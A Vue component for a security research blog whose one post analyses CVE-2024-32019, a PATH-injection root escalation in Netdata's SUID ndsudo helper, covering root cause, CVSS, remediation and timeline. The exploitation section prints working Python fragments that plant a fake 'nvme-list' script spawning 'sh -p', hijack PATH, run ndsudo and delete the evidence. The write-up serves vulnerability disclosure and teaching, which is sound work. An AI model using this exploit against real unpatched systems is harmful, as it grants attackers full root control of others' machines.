<template>
  <div class="blog-root">

    <!-- ── GRID VIEW ──────────────────────────────── -->
    <div v-if="!activePost" class="grid-view">
      <div class="blog-header">
        <p class="section-pre">// research & analysis</p>
        <h1 class="section-title">BLOG</h1>
        <p class="section-sub">Technical write-ups, vulnerability research and security analysis.</p>
      </div>

      <div class="posts-grid">
        <article
          v-for="post in posts"
          :key="post.id"
          class="post-card"
          @click="activePost = post"
        >
          <div class="card-top">
            <span class="card-category">{{ post.category }}</span>
            <span class="card-cvss" v-if="post.cvss">CVSS {{ post.cvss }}</span>
          </div>
          <h2 class="card-title">{{ post.title }}</h2>
          <p class="card-excerpt">{{ post.excerpt }}</p>
          <div class="card-tags">
            <span class="card-tag" v-for="tag in post.tags" :key="tag">{{ tag }}</span>
          </div>
          <div class="card-footer">
            <span class="card-date">{{ post.date }}</span>
            <span class="card-read">{{ post.readTime }}</span>
          </div>
        </article>
      </div>
    </div>

    <!-- ── POST VIEW ──────────────────────────────── -->
    <div v-else class="post-view">
      <button class="back-btn" @click="activePost = null">← Back to Blog</button>

      <header class="post-header">
        <div class="post-meta-top">
          <span class="card-category">{{ activePost.category }}</span>
          <span class="card-cvss" v-if="activePost.cvss">CVSS {{ activePost.cvss }}</span>
        </div>
        <h1 class="post-title">{{ activePost.title }}</h1>
        <div class="post-meta">
          <span class="post-author">{{ activePost.author }}</span>
          <span class="meta-sep">·</span>
          <span class="post-date">{{ activePost.date }}</span>
          <span class="meta-sep">·</span>
          <span class="post-read">{{ activePost.readTime }}</span>
        </div>
        <div class="post-tags">
          <span class="card-tag" v-for="tag in activePost.tags" :key="tag">{{ tag }}</span>
        </div>
      </header>

      <div class="post-body">
        <template v-for="(block, i) in activePost.content" :key="i">
          <p      v-if="block.type === 'p'"       class="p-text" v-html="block.text"></p>
          <h2     v-else-if="block.type === 'h2'" class="p-h2">{{ block.text }}</h2>
          <h3     v-else-if="block.type === 'h3'" class="p-h3">{{ block.text }}</h3>
          <pre    v-else-if="block.type === 'code'" class="p-code"><code>{{ block.text }}</code></pre>
          <ul     v-else-if="block.type === 'ul'"  class="p-ul">
            <li v-for="(item, j) in block.items" :key="j" v-html="item"></li>
          </ul>
          <div    v-else-if="block.type === 'callout'" :class="['p-callout', block.variant]">{{ block.text }}</div>
          <table  v-else-if="block.type === 'table'" class="p-table-wrap">
            <thead><tr><th v-for="h in block.headers" :key="h">{{ h }}</th></tr></thead>
            <tbody><tr v-for="(row, ri) in block.rows" :key="ri"><td v-for="(cell, ci) in row" :key="ci">{{ cell }}</td></tr></tbody>
          </table>
          <a v-else-if="block.type === 'github'" :href="block.url" target="_blank" rel="noopener" class="gh-card">
            <div class="gh-card-left">
              <div class="gh-header">
                <svg class="gh-icon" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
                  <path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12c0-6.63-5.37-12-12-12z"/>
                </svg>
                <span class="gh-user">{{ block.user }}</span>
                <span class="gh-slash">/</span>
                <span class="gh-repo">{{ block.repo }}</span>
              </div>
              <p class="gh-desc">{{ block.description }}</p>
              <div class="gh-footer">
                <span class="gh-lang">
                  <span class="gh-lang-dot"></span>{{ block.language }}
                </span>
                <span class="gh-cve-badge">CVE-2024-32019</span>
              </div>
            </div>
            <div class="gh-card-right">
              <span class="gh-arrow">↗</span>
            </div>
          </a>
        </template>
      </div>
    </div>

  </div>
</template>

<script setup>
import { ref } from 'vue'

const activePost = ref(null)

const posts = ref([
  {
    id: 1,
    title: 'CVE-2024-32019: Local Privilege Escalation in Netdata Agent via ndsudo',
    excerpt: 'Analysis of an untrusted search path vulnerability (CWE-426) in Netdata\'s SUID binary ndsudo that allows a local low-privileged user to escalate to root by injecting a malicious executable into the PATH resolution chain.',
    date: 'April 2024',
    category: 'CVE Analysis',
    cvss: '8.8',
    author: 'julichaan',
    readTime: '10 min read',
    tags: ['CVE-2024-32019', 'Privilege Escalation', 'Netdata', 'SUID', 'Linux', 'CWE-426'],
    content: [
      {
        type: 'callout', variant: 'info',
        text: 'CVE-2024-32019 · CVSS 8.8 (HIGH) · CWE-426 Untrusted Search Path · Netdata Agent < 1.45.3 · Published: April 2024'
      },
      {
        type: 'h2', text: '1. Overview'
      },
      {
        type: 'p',
        text: 'CVE-2024-32019 is a high-severity local privilege escalation (LPE) vulnerability affecting Netdata Agent versions prior to <code>1.45.3</code>. The flaw resides in <code>ndsudo</code>, a SUID root-owned binary bundled with the Netdata monitoring agent. The vulnerability arises from the failure to sanitize or reset the <code>PATH</code> environment variable before resolving command names, a classic manifestation of CWE-426 (Untrusted Search Path). A local attacker with low privileges can exploit this behaviour to execute arbitrary code with root permissions, achieving full system compromise.'
      },
      {
        type: 'github',
        user: 'julichaan',
        repo: 'CVE-2024-32019-ndsudo-local-privilege-escalation-NetData',
        description: 'Proof-of-concept exploit for CVE-2024-32019 — local privilege escalation via SUID ndsudo binary in Netdata Agent < 1.45.3.',
        language: 'Python',
        url: 'https://github.com/julichaan/CVE-2024-32019-ndsudo-local-privilege-escalation-NetData'
      },
      {
        type: 'h2', text: '2. Technical Background: ndsudo and the SUID Mechanism'
      },
      {
        type: 'p',
        text: '<code>ndsudo</code> is an internal helper binary within the Netdata Agent designed to allow the unprivileged Netdata daemon to execute a restricted set of system commands with elevated privileges. It is owned by <code>root</code> and has the <strong>SUID bit</strong> (Set User ID on execution) set.'
      },
      {
        type: 'p',
        text: 'The SUID permission flag instructs the Linux kernel to execute a binary with the effective UID of the file\'s owner rather than the UID of the invoking user. For root-owned SUID binaries, this means any system user can trigger execution context with <code>euid=0</code>. This mechanism is used legitimately by utilities such as <code>passwd</code>, <code>ping</code>, and <code>sudo</code>, all of which are specifically hardened against environment-based attacks. <code>ndsudo</code> was not.'
      },
      {
        type: 'table',
        headers: ['Binary', 'Owner', 'SUID', 'PATH Sanitisation'],
        rows: [
          ['sudo', 'root', 'Yes', 'Yes — resets to safe defaults'],
          ['passwd', 'root', 'Yes', 'Not applicable'],
          ['ndsudo (< 1.45.3)', 'root', 'Yes', 'No — inherits caller\'s PATH'],
        ]
      },
      {
        type: 'h2', text: '3. Root Cause Analysis: CWE-426 Untrusted Search Path'
      },
      {
        type: 'p',
        text: 'When <code>ndsudo</code> is invoked with a whitelisted command name (e.g. <code>nvme-list</code>, <code>ip</code>, <code>node</code>), it resolves the absolute path of that command by searching through the directories enumerated in the <code>PATH</code> environment variable. Because <code>PATH</code> is inherited directly from the calling user\'s environment and is never validated, filtered, or overridden prior to resolution, the attacker retains full control over the search order.'
      },
      {
        type: 'p',
        text: 'The Linux dynamic linker and shell command resolution proceed left-to-right through <code>PATH</code>. By prepending an attacker-controlled directory — such as the current working directory — any command name can be shadowed. When <code>ndsudo</code> subsequently attempts to locate the whitelisted binary, the operating system finds the malicious impersonator first and executes it under root privileges.'
      },
      {
        type: 'callout', variant: 'warn',
        text: 'The vulnerability is not in the whitelist mechanism itself, but in the implicit trust placed on the caller-supplied environment during path resolution. The whitelist only validates the command name, not the resolved absolute path.'
      },
      {
        type: 'h2', text: '4. Exploitation'
      },
      {
        type: 'p',
        text: 'The exploit (<code>poc.py</code>) implements the attack in four sequential phases. Each phase is examined below with direct reference to the source code.'
      },
      {
        type: 'h3', text: 'Phase 1 — Binary Discovery'
      },
      {
        type: 'p',
        text: 'The exploit begins by locating the <code>ndsudo</code> binary on the target system. Three common installation paths are enumerated, covering the majority of Netdata deployment configurations across different Linux distributions and package managers.'
      },
      {
        type: 'code',
        text:
`NDSUDO_PATHS = [
    "/usr/libexec/netdata/plugins.d/ndsudo",
    "/usr/lib/netdata/plugins.d/ndsudo",
    "/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo"
]

def find_ndsudo():
    for path in NDSUDO_PATHS:
        if os.path.exists(path) and os.access(path, os.X_OK):
            return path`
      },
      {
        type: 'p',
        text: 'The check <code>os.access(path, os.X_OK)</code> ensures the binary is not only present but executable by the current user — a prerequisite for invocation. As a fallback, the function also queries <code>which ndsudo</code> to handle non-standard installations.'
      },
      {
        type: 'h3', text: 'Phase 2 — Payload Construction'
      },
      {
        type: 'p',
        text: 'A shell script impersonating the target whitelisted command (defaulting to <code>nvme-list</code>) is written to the current working directory and marked executable.'
      },
      {
        type: 'code',
        text:
`TARGET_CMD = "nvme-list"

payload_content = """#!/bin/sh
/bin/sh -p
"""

with open(TARGET_CMD, "w") as f:
    f.write(payload_content)

os.chmod(TARGET_CMD, st.st_mode | stat.S_IEXEC)`
      },
      {
        type: 'p',
        text: 'The <code>-p</code> flag passed to <code>/bin/sh</code> is of critical importance. Without it, modern shells (bash, dash) detect a discrepancy between the real UID and effective UID — a consequence of the SUID mechanism — and voluntarily drop privileges as a defensive measure. The <code>-p</code> flag (privileged mode) suppresses this behaviour, preserving the root effective UID throughout the shell session.'
      },
      {
        type: 'h3', text: 'Phase 3 — PATH Injection'
      },
      {
        type: 'p',
        text: 'The attacker\'s current working directory is prepended to the <code>PATH</code> variable in a copy of the current process environment. This modified environment is then passed to the <code>ndsudo</code> invocation.'
      },
      {
        type: 'code',
        text:
`cwd = os.getcwd()
new_env = os.environ.copy()
original_path = new_env.get("PATH", "")
new_env["PATH"] = f"{cwd}:{original_path}"`
      },
      {
        type: 'p',
        text: 'The use of <code>os.environ.copy()</code> rather than replacing the environment entirely is deliberate: it ensures all other required environment variables remain intact, avoiding execution errors that might arise from a stripped environment, while only modifying the <code>PATH</code> entry.'
      },
      {
        type: 'h3', text: 'Phase 4 — Execution and Cleanup'
      },
      {
        type: 'code',
        text:
`subprocess.run([ndsudo_path, TARGET_CMD], env=new_env)

if os.path.exists(TARGET_CMD):
    os.remove(TARGET_CMD)`
      },
      {
        type: 'p',
        text: '<code>ndsudo</code> is invoked with the tampered environment. The kernel executes it with <code>euid=0</code>. When <code>ndsudo</code> resolves <code>nvme-list</code>, it traverses the injected <code>PATH</code>, locates the malicious script in the current directory first, and executes it — spawning an interactive root shell. Upon return, the malicious binary is deleted from disk, reducing forensic artifacts.'
      },
      {
        type: 'h2', text: '5. CVSS 3.1 Vector Breakdown'
      },
      {
        type: 'p',
        text: 'The assigned vector is <code>AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H</code>, yielding a base score of <strong>8.8 (HIGH)</strong>.'
      },
      {
        type: 'table',
        headers: ['Metric', 'Value', 'Rationale'],
        rows: [
          ['Attack Vector', 'Local (L)', 'Requires an existing shell on the target system'],
          ['Attack Complexity', 'Low (L)', 'No race conditions or special configuration required'],
          ['Privileges Required', 'Low (L)', 'Any unprivileged local account suffices'],
          ['User Interaction', 'None (N)', 'No action from another user is required'],
          ['Scope', 'Changed (C)', 'Execution context escalates beyond the original security domain'],
          ['Confidentiality', 'High (H)', 'Full read access to all system data'],
          ['Integrity', 'High (H)', 'Unrestricted write access to all system data'],
          ['Availability', 'High (H)', 'Complete control over system resources and processes'],
        ]
      },
      {
        type: 'h2', text: '6. Affected Versions and Remediation'
      },
      {
        type: 'ul',
        items: [
          '<strong>Affected:</strong> Netdata Agent &lt; 1.45.3 and &lt; 1.45.2-169',
          '<strong>Patched:</strong> Netdata Agent ≥ 1.45.3',
          '<strong>Workarounds:</strong> None — upgrade is the only remediation path',
        ]
      },
      {
        type: 'p',
        text: 'The remediation introduced by the Netdata team involves explicitly resetting the <code>PATH</code> environment variable to a safe, known-good value within <code>ndsudo</code> prior to any command resolution. This eliminates the attacker\'s ability to influence the search path regardless of what the calling process supplies.'
      },
      {
        type: 'callout', variant: 'info',
        text: 'General guidance for hardening SUID binaries: always reset PATH and other security-sensitive environment variables (IFS, LD_PRELOAD, LD_LIBRARY_PATH) to safe defaults at the earliest possible point in execution.'
      },
      {
        type: 'h2', text: '7. Disclosure Timeline'
      },
      {
        type: 'table',
        headers: ['Date', 'Event'],
        rows: [
          ['April 12, 2024', 'CVE-2024-32019 first reported / published'],
          ['April 2024', 'Netdata Agent 1.45.3 released with patch'],
          ['November 21, 2024', 'Last NVD modification entry'],
        ]
      },
      {
        type: 'h2', text: '8. Conclusion'
      },
      {
        type: 'p',
        text: 'CVE-2024-32019 is a textbook instance of CWE-426 applied to a privileged binary. The vulnerability requires no exploitation of memory corruption, no kernel bugs, and no complex preconditions — only a local shell and a writable directory. The low attack complexity combined with a changed scope and complete CIA impact justifies the HIGH severity rating. This case reinforces a fundamental principle of secure systems programming: any binary that executes with elevated privileges must treat all caller-supplied input — including environment variables — as untrusted and potentially hostile.'
      },
    ]
  }
])
</script>

<style scoped>
/* ── Base ────────────────────────────────────────── */
.blog-root {
  min-height: 100vh;
  background: #000;
  font-family: 'JetBrains Mono', monospace;
  color: #ccc;
  padding: 3rem 2rem;
}

/* ── Grid View ───────────────────────────────────── */
.grid-view { max-width: 1200px; margin: 0 auto; }

.blog-header { text-align: center; margin-bottom: 4rem; }
.section-pre   { font-size: .7rem; letter-spacing: .2em; color: #ff003c44; margin: 0 0 .6rem; }
.section-title { font-size: 2.6rem; font-weight: 900; letter-spacing: .3em; color: #ff003c; margin: 0 0 1rem; }
.section-sub   { font-size: .82rem; color: #444; max-width: 520px; margin: 0 auto; line-height: 1.8; }

.posts-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
  gap: 1.5rem;
}

.post-card {
  background: #080808;
  border: 1px solid #ffffff0a;
  border-radius: 3px;
  padding: 1.8rem;
  cursor: pointer;
  transition: border-color .2s, background .2s, transform .15s;
  display: flex;
  flex-direction: column;
  gap: 1rem;
}
.post-card:hover {
  border-color: #38bdf833;
  background: #0a0d10;
  transform: translateY(-2px);
}

.card-top { display: flex; gap: .75rem; align-items: center; }
.card-category {
  font-size: .65rem; letter-spacing: .15em; text-transform: uppercase;
  color: #ff003c; border: 1px solid #ff003c44; padding: 3px 8px; border-radius: 2px;
}
.card-cvss {
  font-size: .65rem; letter-spacing: .12em;
  color: #f59e0b; border: 1px solid #f59e0b44; padding: 3px 8px; border-radius: 2px;
}

.card-title {
  font-size: 1rem; font-weight: 700; color: #fff;
  line-height: 1.5; margin: 0;
}
.card-excerpt {
  font-size: .78rem; color: #555; line-height: 1.8; margin: 0;
  flex: 1;
}
.card-tags { display: flex; flex-wrap: wrap; gap: 6px; }
.card-tag {
  font-size: .62rem; padding: 3px 8px;
  border: 1px solid #38bdf822; color: #38bdf888; border-radius: 2px;
  letter-spacing: .04em;
}
.card-footer {
  display: flex; justify-content: space-between;
  font-size: .68rem; color: #333; padding-top: .75rem;
  border-top: 1px solid #ffffff08;
}

/* ── Post View ───────────────────────────────────── */
.post-view { max-width: 820px; margin: 0 auto; }

.back-btn {
  font-family: inherit; font-size: .75rem; letter-spacing: .1em;
  color: #38bdf8; background: transparent;
  border: 1px solid #38bdf833; padding: 7px 16px;
  border-radius: 2px; cursor: pointer;
  transition: all .15s; margin-bottom: 2.5rem;
  text-transform: uppercase;
}
.back-btn:hover { background: #38bdf80d; border-color: #38bdf8; }

.post-header { margin-bottom: 3rem; }
.post-meta-top { display: flex; gap: .75rem; margin-bottom: 1.25rem; }
.post-title {
  font-size: 1.65rem; font-weight: 900; color: #fff;
  line-height: 1.4; margin: 0 0 1rem;
}
.post-meta {
  display: flex; gap: .75rem; align-items: center;
  font-size: .72rem; color: #444; margin-bottom: 1rem;
}
.meta-sep { color: #333; }
.post-tags { display: flex; flex-wrap: wrap; gap: 6px; }

/* ── Article Body ────────────────────────────────── */
.post-body { display: flex; flex-direction: column; gap: 1.4rem; }

.p-h2 {
  font-size: 1rem; font-weight: 900; color: #ff003c;
  letter-spacing: .15em; text-transform: uppercase;
  border-bottom: 1px solid #ff003c22; padding-bottom: .5rem;
  margin: 1.5rem 0 0; padding-top: 1rem;
}
.p-h3 {
  font-size: .88rem; font-weight: 700; color: #38bdf8;
  letter-spacing: .1em; margin: .5rem 0 0;
}
.p-text {
  font-size: .88rem; color: #888; line-height: 1.95; margin: 0;
}
.p-text code       { color: #38bdf8; background: #38bdf80d; padding: 1px 5px; border-radius: 2px; font-family: inherit; }
.p-text a          { color: #38bdf8; text-decoration: underline; text-underline-offset: 3px; }
.p-text strong     { color: #ccc; font-weight: 700; }

.p-code {
  background: #08090a;
  border: 1px solid #38bdf81a;
  border-left: 3px solid #38bdf8;
  border-radius: 2px;
  padding: 1.25rem 1.5rem;
  font-family: 'JetBrains Mono', monospace;
  font-size: .8rem;
  color: #a5f3fc;
  overflow-x: auto;
  line-height: 1.7;
  margin: 0;
  white-space: pre;
}
.p-code code { font-family: inherit; }

.p-ul {
  padding-left: 1.25rem;
  display: flex; flex-direction: column; gap: .6rem;
  margin: 0;
}
.p-ul li {
  font-size: .88rem; color: #888; line-height: 1.85;
  list-style: none;
}
.p-ul li::before {
  content: '▸ ';
  color: #38bdf8;
  font-size: .75rem;
}
.p-ul li strong { color: #ccc; }

.p-callout {
  padding: 1rem 1.25rem;
  border-radius: 2px;
  font-size: .8rem;
  line-height: 1.8;
}
.p-callout.info {
  background: #38bdf80d; border: 1px solid #38bdf833; color: #38bdf8;
}
.p-callout.warn {
  background: #ff003c0d; border: 1px solid #ff003c44; color: #ff6688;
}

.p-table-wrap {
  width: 100%;
  border-collapse: collapse;
  font-size: .78rem;
}
.p-table-wrap th {
  text-align: left; padding: .6rem .9rem;
  background: #0a0a0a; color: #38bdf8;
  border: 1px solid #38bdf81a;
  letter-spacing: .08em; font-weight: 700;
}
.p-table-wrap td {
  padding: .6rem .9rem;
  border: 1px solid #ffffff07;
  color: #666; line-height: 1.6;
}
.p-table-wrap tr:nth-child(even) td { background: #0a0a0a; }

/* ── GitHub Card ─────────────────────────────────── */
.gh-card {
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 1rem;
  padding: 1.25rem 1.5rem;
  background: #08090a;
  border: 1px solid #ffffff12;
  border-radius: 3px;
  text-decoration: none;
  transition: border-color .2s, background .2s;
}
.gh-card:hover {
  border-color: #38bdf855;
  background: #0a0d10;
}
.gh-card-left { display: flex; flex-direction: column; gap: .7rem; flex: 1; min-width: 0; }
.gh-header { display: flex; align-items: center; gap: .45rem; flex-wrap: wrap; }
.gh-icon { width: 18px; height: 18px; color: #ccc; flex-shrink: 0; }
.gh-user  { font-size: .82rem; color: #666; }
.gh-slash { font-size: .82rem; color: #333; }
.gh-repo  { font-size: .82rem; font-weight: 700; color: #38bdf8; word-break: break-all; }
.gh-desc  { font-size: .78rem; color: #555; line-height: 1.7; margin: 0; }
.gh-footer { display: flex; align-items: center; gap: .9rem; }
.gh-lang {
  display: flex; align-items: center; gap: .4rem;
  font-size: .72rem; color: #666;
}
.gh-lang-dot {
  width: 10px; height: 10px; border-radius: 50%;
  background: #3572A5; flex-shrink: 0;
}
.gh-cve-badge {
  font-size: .65rem; padding: 2px 8px;
  border: 1px solid #ff003c44; color: #ff003c;
  border-radius: 2px; letter-spacing: .08em;
}
.gh-card-right { flex-shrink: 0; }
.gh-arrow {
  font-size: 1.3rem; color: #38bdf844;
  transition: color .2s, transform .15s;
  display: block;
}
.gh-card:hover .gh-arrow { color: #38bdf8; transform: translate(2px, -2px); }

/* ── Responsive ──────────────────────────────────── */
@media (max-width: 768px) {
  .blog-root { padding: 2rem 1rem; }
  .posts-grid { grid-template-columns: 1fr; }
  .post-title { font-size: 1.2rem; }
  .section-title { font-size: 1.8rem; }
}
</style>
